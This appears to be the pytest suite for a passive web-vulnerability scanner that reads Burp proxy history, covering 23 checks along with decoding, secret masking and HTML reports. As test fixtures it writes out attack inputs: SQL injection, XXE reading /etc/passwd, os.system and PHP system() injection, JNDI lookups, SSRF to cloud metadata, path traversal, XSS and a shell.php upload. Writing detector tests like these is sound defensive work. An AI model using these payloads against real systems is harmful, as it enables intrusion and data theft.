"""
test_passive_scan.py — pytest coverage for every check and the cross-cutting
behaviours (base64/hex decoding, Burp import, secret redaction, JSON/HTML report
round-trip).

Run:  pytest -q
      pytest -q -k xss          # one check
      pytest -q tests/test_passive_scan.py::test_checks_positive

The `make_db` and `run_check` fixtures come from conftest.py.

Each check has at least one POSITIVE case (a crafted row that must produce a
finding for that check) and a NEGATIVE case (a benign row that must not). Cases
are declared as data so the matrix is easy to read and extend.
"""

import json
import pathlib
import sqlite3

import pytest

import cru.checks
from cru import field_decode
from cru import passive_scan as ps
from cru.checks import CHECKS


def checks_of(findings):
    return {f.check for f in findings}


def sigs_of(findings):
    return {f.signature for f in findings}


# --------------------------------------------------------------------------- #
# Positive matrix: (check, row) -> must yield >=1 finding whose .check == check,
# and (optionally) a signature substring that must appear.
# --------------------------------------------------------------------------- #

import base64 as _b64
import pickle as _pickle


def b64(s):
    return _b64.b64encode(s.encode()).decode()


POSITIVE = {
    "deserialization": [
        (
            dict(
                method="POST",
                body="state=" + _b64.b64encode(b"\xac\xed\x00\x05sr\x00").decode(),
            ),
            None,
        ),  # java serialized magic (base64 of real bytes)
        (
            dict(method="POST", body='data=O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}'),
            "php-serialized-object",
        ),
        (
            dict(
                method="POST",
                body="state="
                + _b64.b64encode(_pickle.dumps({"a": 1}, protocol=4)).decode(),
            ),
            "python-pickle",
        ),
    ],
    "secrets": [
        (dict(response_body='{"k":"AKIAIOSFODNN7EXAMPLE"}'), "aws-access-key-id"),
        (dict(headers="Authorization: Bearer ghp_" + "A" * 36), "github-pat"),
    ],
    "sqli": [
        (
            dict(
                response_status_code=500,
                response_body="You have an error in your SQL syntax; check the "
                "manual that corresponds to your MySQL server version",
            ),
            "sql-error-in-response",
        ),
        (dict(query="q=x' UNION SELECT a,b FROM users--"), "sqli-payload"),
        # parameter names that advertise a query-composition sink
        (dict(query="sqlQuery=SELECT+1"), "sqli-param:raw-sql-name (sink)"),
        (dict(method="POST", body='{"sql_query":"select 1"}'), "(sink)"),
        (dict(query="orderBy=name"), "sqli-param:clause-name (clause)"),
    ],
    "ssti": [
        (dict(query="q={{config.items()}}"), "template-syntax"),
        (dict(query="q=${{<%[%'\"}}%"), "template-syntax: SSTI polyglot"),
    ],
    "code": [
        (dict(method="POST", body="x=__import__('os').system('id')"), "code:python"),
        (dict(headers="User-Agent: ${jndi:ldap://x/a}"), "code:jndi-lookup"),
    ],
    "srcleak": [
        (dict(path="/i.php", response_body="<?php echo 1; ?>"), "php-source"),
        (dict(path="/.env", response_body="DB_PASSWORD=hunter2\nAPP_KEY=x"), "dotenv"),
    ],
    "xss": [
        (
            dict(
                query="q=<script>alert(1)</script>",
                response_body="echo <script>alert(1)</script>",
            ),
            "reflected",
        ),
        (dict(query="u=<img src=x onerror=alert(1)>"), "xss-payload"),
    ],
    "xxe": [
        (
            dict(
                method="POST",
                body='<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>',
            ),
            "xxe:external-entity",
        ),
        (dict(response_body="root:x:0:0:root:/root:/bin/bash"), "xxe:file-disclosure"),
    ],
    "ssrf": [
        (
            dict(query="url=http://169.254.169.254/latest/meta-data/"),
            "ssrf:cloud-metadata",
        ),
        (dict(query="image=http://127.0.0.1:9000/x"), "ssrf:internal-host"),
    ],
    "redirect": [
        (
            dict(
                query="next=https://evil.example/x",
                response_status_code=302,
                response_headers="Location: https://evil.example/x",
            ),
            "open-redirect-reflected",
        ),
        (dict(query="redirect=//evil.example"), "open-redirect-candidate"),
    ],
    "traversal": [
        (dict(query="file=../../../../etc/passwd"), "path-traversal"),
    ],
    "crlf": [
        (dict(query="x=en%0d%0aSet-Cookie:%20evil=1"), "crlf"),
    ],
    "nosqli": [
        (
            dict(
                method="POST",
                headers="Content-Type: application/json",
                body='{"u":{"$ne":null}}',
            ),
            "nosql-operator",
        ),
        (dict(query="age[$gt]=0"), "nosql-param-operator"),
    ],
    "upload": [
        (
            dict(
                method="POST",
                headers="Content-Type: multipart/form-data; boundary=x",
                body='Content-Disposition: form-data; name="f"; '
                'filename="shell.php"\r\n',
            ),
            "executable-extension",
        ),
    ],
    "security-headers": [
        (
            dict(
                response_headers="Content-Type: text/html",
                response_body="<html></html>",
            ),
            "missing-csp",
        ),
    ],
    "cors": [
        (
            dict(
                response_headers="Access-Control-Allow-Origin: *\n"
                "Access-Control-Allow-Credentials: true"
            ),
            "cors:wildcard-with-credentials",
        ),
        (
            dict(response_headers="Access-Control-Allow-Origin: null"),
            "cors:null-origin",
        ),
    ],
    "cookies": [
        (
            dict(response_headers="Set-Cookie: sessionid=abc; path=/"),
            "cookie-no-httponly",
        ),
    ],
    "jwt": [
        (
            dict(
                headers="Authorization: Bearer "
                + _b64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}')
                .rstrip(b"=")
                .decode()
                + "."
                + _b64.urlsafe_b64encode(b'{"user":"admin","sub":1}')
                .rstrip(b"=")
                .decode()
                + ".AAAAAAAAAAAA"
            ),
            "jwt:alg-none",
        ),
    ],
    "infoleak": [
        (
            dict(response_body="Traceback (most recent call last):\n  File x"),
            "python-traceback",
        ),
        (dict(response_body="<title>Index of /files</title>"), "dir-listing"),
    ],
    "fingerprint": [
        (dict(response_headers="Server: nginx/1.18.0"), "banner:server"),
    ],
    "mixedcontent": [
        (
            dict(
                is_tls=1,
                response_headers="Content-Type: text/html",
                response_body='<script src="http://cdn/x.js"></script>',
            ),
            "mixed-content",
        ),
    ],
    "cleartext": [
        (
            dict(is_tls=0, method="POST", body="username=a&password=secret"),
            "cleartext-transmission",
        ),
    ],
    "csrf": [
        (
            dict(
                method="POST",
                cookies="session=abc",
                headers="Cookie: session=abc",
                body="email=x@y.com",
            ),
            "missing-csrf-token",
        ),
    ],
}


# Benign rows that must NOT trigger the given check.
NEGATIVE = {
    # The avatar URL is deliberate: its base64-ish segment decodes to bytes that
    # happen to contain \x80\x04, which used to read as a pickle PROTO opcode.
    "deserialization": dict(
        method="POST",
        body="name=John&city=Wellington",
        response_body='{"picture":"https://lh3.googleusercontent.com/a/'
        'ACg8ocI-B8h3xWwEP-gAT8dQeH_UpcjzdyOIPIO1-WwJARJaAbtIgQ=s96-c"}',
    ),
    # The ObjectId is deliberate: 24-hex resource IDs are enumeration
    # candidates for idor_finder, not secrets, so entropy must ignore them.
    "secrets": dict(
        response_body='{"ok":true,"count":3,"_id":"6a951f7f1af62e63c9e34025"}'
    ),
    "sqli": dict(query="q=coffee&sort=name&id=7", response_body="Results for coffee"),
    "ssti": dict(query="q=hello world"),
    "code": dict(query="note=please review the system before importing data"),
    "srcleak": dict(path="/app.js", response_body="function f(){console.log('hi')}"),
    "xss": dict(query="q=coffee", response_body="Results for coffee"),
    "xxe": dict(method="POST", body="<note><to>x</to></note>"),
    "ssrf": dict(query="id=42&sort=name"),
    "redirect": dict(query="page=2"),
    "traversal": dict(query="file=report.pdf"),
    "crlf": dict(query="q=hello"),
    "nosqli": dict(method="POST", body='{"user":"admin","age":30}'),
    "upload": dict(method="POST", body='filename="photo.jpg"'),
    "security-headers": dict(
        is_tls=1,
        response_headers="Content-Type: text/html\n"
        "Content-Security-Policy: default-src 'self'\n"
        "Strict-Transport-Security: max-age=1\n"
        "X-Frame-Options: DENY\nX-Content-Type-Options: nosniff\n"
        "Referrer-Policy: no-referrer\n"
        "Permissions-Policy: geolocation=()",
        response_body="<html>ok</html>",
    ),
    "cors": dict(response_headers="Content-Type: application/json"),
    "cookies": dict(
        response_headers="Set-Cookie: sid=x; Secure; HttpOnly; " "SameSite=Strict"
    ),
    "jwt": dict(response_body='{"ok":true}'),
    "infoleak": dict(response_body="<html><body>Welcome</body></html>"),
    "fingerprint": dict(response_headers="Content-Type: text/html"),
    "mixedcontent": dict(
        is_tls=1,
        response_headers="Content-Type: text/html",
        response_body='<script src="https://cdn/x.js"></script>',
    ),
    "cleartext": dict(is_tls=1, method="POST", body="username=a&password=secret"),
    "csrf": dict(
        method="POST",
        cookies="session=abc",
        headers="Cookie: session=abc",
        body="email=x@y.com&csrf_token=deadbeef",
    ),
}


ALL_CHECKS = sorted(c.name for c in ps.build_checks("all"))


def test_every_check_module_is_registered():
    """A module in cru/checks/ that nobody registered is a check that never runs.

    `build_checks` and the --check choices both read the registry, so an
    unregistered module fails silently everywhere else, this test included.
    """
    package = pathlib.Path(cru.checks.__file__).parent
    # A module stem maps to its registry key with underscores as hyphens:
    # `security_headers.py` has to be importable, `--check security-headers`
    # has to read well.
    modules = {p.stem.replace("_", "-") for p in package.glob("*.py")}
    assert modules - {"--init--", "base"} == set(CHECKS)
    for key, cls in CHECKS.items():
        assert cls.name == key, f"{cls.__name__}.name is not its registry key"


def test_every_check_has_cases():
    """Guard: the matrix must cover every registered check.

    An empty case list is the same as no cases — `test_checks_positive` would
    loop over nothing and pass — so the entry has to hold something.
    """
    missing_pos = [c for c in ALL_CHECKS if not POSITIVE.get(c)]
    missing_neg = [c for c in ALL_CHECKS if not NEGATIVE.get(c)]
    assert not missing_pos, f"no positive cases for: {missing_pos}"
    assert not missing_neg, f"no negative cases for: {missing_neg}"


@pytest.mark.parametrize("check", ALL_CHECKS)
def test_checks_positive(check, run_check):
    """Each positive case yields at least one finding for its own check."""
    for row, sig_substr in POSITIVE[check]:
        findings = run_check(check, [row])
        assert check in checks_of(
            findings
        ), f"{check}: expected a finding for row={row}"
        if sig_substr:
            assert any(sig_substr in f.signature for f in findings), (
                f"{check}: expected signature containing '{sig_substr}', "
                f"got {sigs_of(findings)}"
            )


@pytest.mark.parametrize("check", ALL_CHECKS)
def test_checks_negative(check, run_check):
    """Benign rows produce no finding for the check under test."""
    findings = run_check(check, [NEGATIVE[check]])
    assert check not in checks_of(
        findings
    ), f"{check}: false positive on benign row -> {sigs_of(findings)}"


# --------------------------------------------------------------------------- #
# Encoding: base64/hex-wrapped payloads must be caught via decoded columns.
# --------------------------------------------------------------------------- #

ENCODED = [
    ("code", dict(method="POST", body="d=" + b64("<?php system(1); ?>")), "code"),
    ("code", dict(query="p=" + b"__import__('os').system('id')".hex()), "code"),
    ("traversal", dict(query="f=" + b64("../../../../etc/passwd")), "traversal"),
    ("ssti", dict(query="t=" + b64("{{config.items()}}")), "ssti"),
    ("xss", dict(query="u=" + b64("<script>alert(1)</script>")), "xss"),
]


@pytest.mark.parametrize("check,row,expect", ENCODED)
def test_encoded_payloads_detected(check, row, expect, run_check):
    findings = run_check(check, [row])
    assert expect in checks_of(
        findings
    ), f"encoded payload not detected via decoded column: {row}"
    assert any(
        "#decoded" in f.location for f in findings
    ), "expected the finding to come from a #decoded view"


def test_encoding_requires_decoded_columns(run_check):
    """Without decoded columns (legacy DB), the encoded payload is not seen."""
    row = dict(method="POST", body="d=" + b64("<?php system(1); ?>"))
    assert run_check("code", [row], decoded=False) == []
    # ... and the same row with the columns filled is a finding, so the case
    # is the columns and not the payload.
    assert run_check("code", [row])


def test_decoded_view_helper():
    assert "system" in field_decode.decoded_view("x=" + b64("system('id')"))
    assert "/etc/passwd" in field_decode.decoded_view(
        "".join(f"%{b:02x}" for b in b"/etc/passwd")
    )
    assert field_decode.decoded_view("just plain text") == ""


def test_decoded_view_reaches_short_wrapped_payloads():
    """A wrapped value is as short as the value someone wrapped."""
    for payload in ("admin", "root", "user=1", "1234", "../../etc/passwd"):
        assert payload in field_decode.decoded_view("v=" + b64(payload)), payload


def test_decoded_view_does_not_read_words_as_base64():
    """Any six-letter word decodes to four printable bytes of nothing."""
    view = field_decode.decoded_view("the answer is either a word or another")
    assert view == "", view
    # `answer` really does decode — to `j{0z`, which is what the gate is for.
    assert field_decode._decoded_text(b"j{0z") is None
    assert field_decode._decoded_text(b"admin") == "admin"


def test_decode_picks_the_alphabet_the_token_is_written_in():
    """Standard base64 does not validate, so a url-safe token decodes to junk."""
    import base64

    token = base64.urlsafe_b64encode(b"\xfb/etc/passwd/root").decode().rstrip("=")
    assert "/etc/passwd" in field_decode.decoded_view("v=" + token)


def test_decoded_view_unwraps_a_payload_wrapped_twice():
    """Wrapping twice is how you get past a decoder that unwraps once."""
    payload = "<?php system(1); ?>"

    b64_of_hex = b64(payload.encode().hex())
    hex_of_b64 = b64(payload).encode().hex()

    assert payload in field_decode.decoded_view("v=" + b64_of_hex)
    assert payload in field_decode.decoded_view("v=" + hex_of_b64)


def test_a_doubly_wrapped_payload_reaches_the_checks(run_check):
    """The point of the decoding: a check sees it without decoding anything."""
    row = dict(method="POST", body="d=" + b64(b64("<?php system(1); ?>")))

    findings = run_check("code", [row])

    assert "code" in checks_of(findings)
    assert any("#decoded" in f.location for f in findings)


def test_unwrapping_stops_at_the_depth_cap():
    """Each layer is cheap; an unbounded chain of them is not."""
    payload = "<?php system(1); ?>"
    wrapped = payload
    for _ in range(field_decode._MAX_DEPTH + 1):
        wrapped = b64(wrapped)

    view = field_decode.decoded_view("v=" + wrapped)

    assert view.count("\n") == field_decode._MAX_DEPTH - 1, view[:120]
    assert payload not in view, "the cap did not hold"
    # One layer shallower and it comes out.
    assert payload in field_decode.decoded_view("v=" + b64(payload))


def test_the_same_plaintext_is_carried_once():
    """The alphabets overlap, so one payload arrives by more than one route.

    A hex run is valid base64 too, and a field repeats its tokens; without the
    visited set every layer re-emits what the last one already produced.
    """
    payload = "<?php system(1); ?>"
    token = b64(payload)

    view = field_decode.decoded_view(f"a={token}&b={token}")

    assert view.count(payload) == 1, view


def test_unwrapping_is_bounded_by_a_budget(monkeypatch):
    """A response can carry thousands of tokens; the field still has a ceiling."""
    monkeypatch.setattr(field_decode, "_MAX_DECODES", 10)
    field = " ".join(b64(f"value-number-{i}") for i in range(200))

    view = field_decode.decoded_view(field)

    assert 0 < view.count("value-number-") <= 10


def test_decoded_view_expands_jwts_as_dot_joined_dicts():
    """A JWT reads as one opaque token; the decoded view spells it out."""
    token = _jwt({"sub": "42", "role": "admin"})

    view = field_decode.decoded_view(f"Authorization: Bearer {token}")

    # The base64 pass already decodes each segment on its own; the line wanted
    # here is the whole token rewritten, dots and all.
    expanded = next(
        line for line in view.split("\n") if line.startswith("{") and "}." in line
    )
    header, claims, signature = expanded.split(".")
    assert json.loads(header)["alg"] == "HS256"
    assert json.loads(claims) == {"sub": "42", "role": "admin"}
    assert signature == token.split(".")[2]


def test_decoded_view_expands_a_jwt_wrapped_in_another_layer():
    """The case the report showed: a token inside a base64 field.

    One decode layer unwraps the field and leaves the JWT intact, so without a
    pass over what was just decoded the claims never become readable.
    """
    token = _jwt({"sub": "42"})
    wrapped = _b64.b64encode(f"Authorization: Bearer {token}".encode()).decode()

    view = field_decode.decoded_view(f"X-Session: {wrapped}")

    assert '"sub": "42"' in view


def test_decoded_view_leaves_a_jwt_lookalike_alone():
    """Two base64url-looking segments and a dot are not a JWT."""
    assert (
        field_decode._jwt_view("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.nope-not-json.sig")
        is None
    )
    assert field_decode.decoded_view(None) == ""


# --------------------------------------------------------------------------- #
# Cross-cutting: dedup, redaction, runner
# --------------------------------------------------------------------------- #


def test_dedup_collapses_identical_findings(run_check):
    row = dict(response_body='{"k":"AKIAIOSFODNN7EXAMPLE"}')
    findings = run_check("secrets", [row, dict(row)])
    aws = [f for f in findings if f.signature == "aws-access-key-id"]
    assert len(aws) == 1, "identical findings across rows should dedupe"


def test_secret_redaction_default_and_reveal(run_check):
    row = dict(response_body='{"k":"AKIAIOSFODNN7EXAMPLE"}')
    findings = run_check("secrets", [row])
    redacted = ps._present(list(findings), show_secrets=False)
    assert all(
        "AKIAIOSFODNN7EXAMPLE" not in f.evidence
        for f in redacted
        if f.check == "secrets"
    )
    # re-run for a clean copy, reveal
    findings2 = run_check("secrets", [row])
    shown = ps._present(list(findings2), show_secrets=True)
    assert any("AKIAIOSFODNN7EXAMPLE" in f.evidence for f in shown)


def test_all_runner_covers_registered_checks():
    checks = ps.build_checks("all")
    assert sorted(c.name for c in checks) == ALL_CHECKS
    assert len(ALL_CHECKS) == 23


@pytest.mark.parametrize(
    "param",
    ["sqlQuery", "sql_query", "sql-query", "SQLQuery", "rawSql", "execSQL"],
)
def test_sqli_flags_sql_parameter_name_permutations(param, run_check):
    """Any casing or separator around "sql" in a parameter name is a sink."""
    findings = run_check("sqli", [dict(query=f"{param}=SELECT+1")])
    assert any(
        "(sink)" in f.signature for f in findings
    ), f"{param} not flagged as a raw SQL sink -> {sigs_of(findings)}"


def test_sqli_param_name_alone_does_not_flag_ordinary_params(run_check):
    """Names that merely look query-ish must not fire; only clause names do."""
    findings = run_check(
        "sqli", [dict(query="query=coffee&filter=new&search=x&columns=id,name")]
    )
    assert not any("sqli-param" in f.signature for f in findings), sigs_of(findings)


def test_sqli_payload_escalation_is_high_note(run_check):
    """Payload + 5xx should carry the 'likely injectable' correlation note."""
    row = dict(
        query="q=1'--",
        response_status_code=500,
        response_body="ORA-00933: SQL command not properly ended",
    )
    findings = run_check("sqli", [row])
    assert any("error-in-response" in f.signature for f in findings)


# --------------------------------------------------------------------------- #
# Importer + report round-trip (import into schema, scan, render)
# --------------------------------------------------------------------------- #


def _burp_xml(items):
    import base64

    parts = ['<?xml version="1.0"?>', "<items>"]
    for method, path, req_body, resp in items:
        target = path
        raw = f"{method} {target} HTTP/1.1\r\nHost: app.test\r\n"
        if req_body:
            raw += (
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(req_body)}\r\n\r\n{req_body}"
            )
        else:
            raw += "\r\n"
        parts += [
            "<item>",
            f"<url><![CDATA[https://app.test{path}]]></url>",
            "<host>app.test</host><port>443</port><protocol>https</protocol>",
            f"<method><![CDATA[{method}]]></method>",
            f"<path><![CDATA[{path}]]></path>",
            (
                f'<request base64="true"><![CDATA['
                f"{base64.b64encode(raw.encode()).decode()}]]></request>"
            ),
            "<status>200</status><responselength>2</responselength>",
            (
                f'<response base64="true"><![CDATA['
                f"{base64.b64encode(resp.encode()).decode()}]]></response>"
            ),
            "</item>",
        ]
    parts.append("</items>")
    return "\n".join(parts)


def test_burp_import_populates_decoded_columns(tmp_path):
    from cru import burp_to_sql

    xml = tmp_path / "h.xml"
    xml.write_text(
        _burp_xml(
            [
                (
                    "POST",
                    "/a",
                    "d=" + b64("<?php system(1); ?>"),
                    "HTTP/1.1 200 OK\r\n\r\nok",
                ),
            ]
        )
    )
    db = tmp_path / "b.db"
    total, _skipped = burp_to_sql.import_burp(str(xml), str(db))
    assert total == 1
    con = sqlite3.connect(str(db))
    cols = {r[1] for r in con.execute("PRAGMA table_info(requests)")}
    assert {"query_decoded", "body_decoded", "response_body_decoded"} <= cols
    bd = con.execute("SELECT body_decoded FROM requests").fetchone()[0]
    assert "system" in bd  # decoded at import time


def test_burp_import_then_scan_finds_encoded(tmp_path):
    from cru import burp_to_sql

    xml = tmp_path / "h.xml"
    xml.write_text(
        _burp_xml(
            [
                (
                    "POST",
                    "/a",
                    "d=" + b64("<?php system(1); ?>"),
                    "HTTP/1.1 200 OK\r\n\r\nok",
                ),
            ]
        )
    )
    db = tmp_path / "b.db"
    burp_to_sql.import_burp(str(xml), str(db))
    rows = ps.load_rows(str(db))
    findings = []
    for c in ps.build_checks("code"):
        findings.extend(c.run(rows))
    assert any("#decoded" in f.location for f in findings)


def test_burp_import_refuses_an_entity_bearing_export(tmp_path):
    """The importer parses attacker-supplied XML; a DTD is the XXE surface.

    This is the very hole the `xxe` check exists to report, so the tool must
    not have it: an external entity has to be refused, not resolved and read
    into the corpus.
    """
    import pytest

    from cru import burp_to_sql

    secret = tmp_path / "secret.txt"
    secret.write_text("TOP-SECRET-LOCAL-FILE")
    xml = tmp_path / "evil.xml"
    xml.write_text(
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE items [<!ENTITY xxe SYSTEM "file://{secret}">]>\n'
        "<items><item><host>app.test</host><path>/&xxe;</path>"
        '<request base64="false"><![CDATA[GET / HTTP/1.1\nHost: app.test\n\n]]>'
        "</request><status>200</status></item></items>"
    )
    db = tmp_path / "e.db"

    with pytest.raises(Exception) as caught:
        burp_to_sql.import_burp(str(xml), str(db))

    assert "Entities" in type(caught.value).__name__ or "DTD" in str(caught.value)
    if db.exists():
        con = sqlite3.connect(str(db))
        stored = con.execute("SELECT path FROM requests").fetchall()
        con.close()
        assert "TOP-SECRET-LOCAL-FILE" not in str(stored)


def _burp_xml_bytes(request: bytes, response: bytes):
    import base64

    return (
        '<?xml version="1.0"?><items><item>'
        "<host>app.test</host><port>443</port><protocol>https</protocol>"
        f'<request base64="true"><![CDATA[{base64.b64encode(request).decode()}]]>'
        "</request><status>200</status>"
        f'<response base64="true"><![CDATA[{base64.b64encode(response).decode()}]]>'
        "</response></item></items>"
    )


def test_burp_import_decompresses_a_gzip_response(tmp_path):
    """A proxy history stores what came off the wire, compressed and all.

    Left compressed, the body is bytes nobody can scan — and the corpus keeps
    a lossy text decode of them, so the secret in it would simply be gone.
    """
    import gzip

    from cru import burp_to_sql

    payload = b'{"k":"AKIAIOSFODNN7EXAMPLE"}'
    body = gzip.compress(payload)
    response = (
        b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n"
        b"Content-Encoding: gzip\r\n\r\n" + body
    )
    xml = tmp_path / "gz.xml"
    xml.write_text(
        _burp_xml_bytes(b"GET /a HTTP/1.1\r\nHost: app.test\r\n\r\n", response)
    )
    db = tmp_path / "gz.db"

    burp_to_sql.import_burp(str(xml), str(db))

    rows = ps.load_rows(str(db))
    assert payload.decode() in rows[0]["response_body"]
    findings = ps.build_checks("secrets")[0].run(rows)
    assert any(f.signature == "aws-access-key-id" for f in findings)


def test_burp_import_skips_an_item_with_no_request(tmp_path):
    """A site-map export carries entries Burp never sent; they are not rows."""
    from cru import burp_to_sql

    xml = tmp_path / "partial.xml"
    xml.write_text(
        '<?xml version="1.0"?><items>'
        "<item><host>app.test</host><path>/a</path></item>"
        + _burp_xml_bytes(
            b"GET /b HTTP/1.1\r\nHost: app.test\r\n\r\n",
            b"HTTP/1.1 200 OK\r\n\r\nok",
        ).split("<items>")[1]
    )
    db = tmp_path / "p.db"

    total, skipped = burp_to_sql.import_burp(str(xml), str(db))

    assert (total, skipped) == (1, 1)


def test_report_json_html_roundtrip(tmp_path, make_db):
    from cru import report_html

    # minimal DB with one clear finding
    db = tmp_path / "r.db"
    con = make_db([dict(response_body='{"k":"AKIAIOSFODNN7EXAMPLE"}')])
    # persist the in-memory DB to disk for the report tool
    disk = sqlite3.connect(str(db))
    con.backup(disk)
    disk.close()

    rows, findings, messages = report_html.collect(
        str(db), "requests", "secrets", False
    )
    doc = report_html.build_report_doc(rows, findings, {"db": str(db)}, messages)
    assert doc["meta"]["total_findings"] == len(findings) >= 1
    html = report_html.render_html(doc)
    # payload must be escaped in the embedded JSON (no raw </script>, and the
    # secret is redacted by default — in the message text too, not just the
    # finding, or the report would leak what the finding hides)
    assert "AKIAIOSFODNN7EXAMPLE" not in html
    assert '<script id="r-data"' in html
    # re-render from the doc alone reproduces the same HTML
    assert report_html.render_html(doc) == html


def test_report_points_at_the_message_the_evidence_came_from(tmp_path, make_db):
    """The dropdown shows the request/response, with the evidence located in it.

    Masking a secret in the message has to preserve length, or every offset
    after it — including this finding's own — would point at the wrong text.
    """
    from cru import report_html

    secret = "AKIAIOSFODNN7EXAMPLE"
    db = tmp_path / "m.db"
    con = make_db(
        [dict(path="/a", query="q=1", body=f'{{"key":"{secret}","tail":"zzz"}}')]
    )
    disk = sqlite3.connect(str(db))
    con.backup(disk)
    disk.close()

    rows, findings, messages = report_html.collect(
        str(db), "requests", "secrets", False
    )
    doc = report_html.build_report_doc(rows, findings, {"db": str(db)}, messages)
    rec = next(f for f in doc["findings"] if f["signature"] == "aws-access-key-id")

    pane = doc["messages"][str(rec["row"])][rec["pane"]]
    assert pane.startswith("GET /a?q=1 HTTP/1.1")
    assert secret not in pane, "the message must not leak what the finding hides"
    # The offsets still land on the (masked) secret, and nothing after it moved.
    assert pane[rec["match"][0] : rec["match"][1]] == report_html._mask(secret)
    assert '"tail":"zzz"' in pane[rec["match"][1] :]


def test_idor_ids_are_listed_masked_and_bounded(tmp_path, make_db):
    """The observed IDs get their own listing, and are not a way round masking.

    An "identifier" is sometimes a credential — idor_finder reads the value of
    a hinted parameter whatever is in it — so a high-entropy one has to be
    masked like any other secret, and a long one truncated or the listing is
    unreadable.
    """
    from cru import report_html

    secret_id = "edcm4pMbXDuCL1mHoOsFaQfDPrAJ71fTquWoGsbeKXgz"
    long_id = "a3f9" * 30
    con = make_db(
        [
            dict(path="/users/1", method="POST", body=f'{{"user_id":"{secret_id}"}}'),
            dict(path="/users/2", method="POST", body=f'{{"user_id":"{long_id}"}}'),
        ]
    )
    db = tmp_path / "ids.db"
    disk = sqlite3.connect(str(db))
    con.backup(disk)
    disk.close()

    _rows, findings, messages = report_html.collect(str(db), "requests", "all", False)
    doc = report_html.build_report_doc(_rows, findings, {"db": str(db)}, messages)

    listed = [v for f in doc["findings"] for v in f["ids"]]
    assert listed, "no IDs listed for an enumerable endpoint"
    # 80 characters and an ellipsis. Spelled out rather than read back from
    # `_ID_DISPLAY`, which would pass whatever the cap were changed to.
    assert all(len(v) <= 81 for v in listed), max(listed, key=len)
    assert any(v.endswith("…") for v in listed), "the long id was not truncated"
    assert secret_id not in json.dumps(doc), "a credential escaped through ids"
    assert any("•" in v for v in listed), "the credential-shaped id was not masked"


def test_a_finding_offers_the_decoded_view_of_its_own_field(tmp_path, make_db):
    """A JWT in a cookie matches in the raw request, so nothing ever matched in
    the decoded view — and the pane that spells the token out was pruned away
    from the one finding that most wanted it.
    """
    from cru import report_html

    db = tmp_path / "d.db"
    con = make_db([dict(cookies=f"session={_jwt({'sub': '42', 'exp': 1})}")])
    disk = sqlite3.connect(str(db))
    con.backup(disk)
    disk.close()

    _rows, findings, messages = report_html.collect(str(db), "requests", "jwt", False)
    doc = report_html.build_report_doc(_rows, findings, {"db": str(db)}, messages)
    rec = doc["findings"][0]

    assert rec["location"] == "request-cookies"
    assert "request-cookies#decoded" in rec["panes"]
    decoded = doc["messages"][str(rec["row"])]["request-cookies#decoded"]
    assert '"sub"' in decoded, "the pane has to actually spell the token out"


def test_a_finding_only_offers_its_own_panes(tmp_path, make_db):
    """The message store is per row, so relevance has to be per finding.

    One request can raise a response-header finding and a decoded-body one. The
    first has no business showing the second's #decoded tab.
    """
    from cru import report_html

    db = tmp_path / "p.db"
    payload = b64("<?php system(1); ?>")
    con = make_db(
        [
            dict(
                method="POST",
                body=f"d={payload}",
                response_headers="Server: nginx/1.2.3",
            )
        ]
    )
    disk = sqlite3.connect(str(db))
    con.backup(disk)
    disk.close()

    _rows, findings, messages = report_html.collect(str(db), "requests", "all", False)
    doc = report_html.build_report_doc(_rows, findings, {"db": str(db)}, messages)

    banner = next(f for f in doc["findings"] if f["check"] == "fingerprint")
    decoded = next(f for f in doc["findings"] if "#decoded" in (f["pane"] or ""))
    assert banner["row"] == decoded["row"], "both findings are on the one request"

    assert banner["panes"] == ["request", "response"]
    assert decoded["pane"] in decoded["panes"]
    # The store still holds the union; it is the offer that is scoped.
    assert decoded["pane"] in doc["messages"][str(banner["row"])]


def test_masking_hides_the_credential_not_the_header_name(tmp_path, make_db):
    """`Authorization: Basic` is context, not the secret.

    The evidence is what gets redacted and masked, so a detector that matches
    its own label blanks the label too and leaves the request unreadable.
    """
    from cru import report_html

    db = tmp_path / "b.db"
    credential = "dXNlcjpwYXNzd29yZDEyMw=="
    con = make_db([dict(headers=f"Authorization: Basic {credential}")])
    disk = sqlite3.connect(str(db))
    con.backup(disk)
    disk.close()

    _rows, findings, messages = report_html.collect(
        str(db), "requests", "secrets", False
    )
    doc = report_html.build_report_doc(_rows, findings, {"db": str(db)}, messages)
    rec = next(f for f in doc["findings"] if f["signature"] == "basic-auth-header")

    pane = doc["messages"][str(rec["row"])][rec["pane"]]
    assert "Authorization: Basic" in pane, "the header name must survive masking"
    assert credential not in pane, "the credential must not"


def test_a_private_key_is_masked_not_just_its_marker(tmp_path, make_db):
    """Matching only the BEGIN line hid the label and left the key in the clear."""
    from cru import report_html

    db = tmp_path / "k.db"
    material = "MIIEowIBAAKCAQEAsecretkeymaterial1234567890"
    pem = (
        "-----BEGIN RSA PRIVATE KEY-----\n"
        f"{material}\n"
        "-----END RSA PRIVATE KEY-----"
    )
    con = make_db([dict(response_body=pem)])
    disk = sqlite3.connect(str(db))
    con.backup(disk)
    disk.close()

    _rows, findings, messages = report_html.collect(
        str(db), "requests", "secrets", False
    )
    doc = report_html.build_report_doc(_rows, findings, {"db": str(db)}, messages)
    rec = next(f for f in doc["findings"] if f["signature"] == "private-key-block")

    pane = doc["messages"][str(rec["row"])][rec["pane"]]
    assert material not in pane, "the key material must not survive masking"


def test_every_finding_links_to_the_rule_that_raised_it():
    """The dropdown's rule name is a link to the check's source upstream."""
    from cru import report_html

    urls = report_html._rule_urls(report_html.REPO_URL)

    assert set(urls) == set(CHECKS) | {"idor"}, "a rule with nowhere to point"
    assert urls["security-headers"].endswith(
        "cru/checks/security_headers.py#L10"
    ), urls["security-headers"]
    assert all(u.startswith(report_html.REPO_URL + "/cru/") for u in urls.values())


def test_report_includes_idor_candidates(tmp_path, make_db):
    """IDOR rides along on a full run so it filters and reads like a check."""
    from cru import report_html

    db = tmp_path / "i.db"
    con = make_db(
        [
            dict(path="/users/1", headers="Authorization: Bearer abc"),
            dict(path="/users/2", headers="Authorization: Bearer abc"),
            dict(path="/users/3", headers="Authorization: Bearer abc"),
        ]
    )
    disk = sqlite3.connect(str(db))
    con.backup(disk)
    disk.close()

    _rows, findings, _messages = report_html.collect(str(db), "requests", "all", False)
    idor = [f for f in findings if f.check == "idor"]
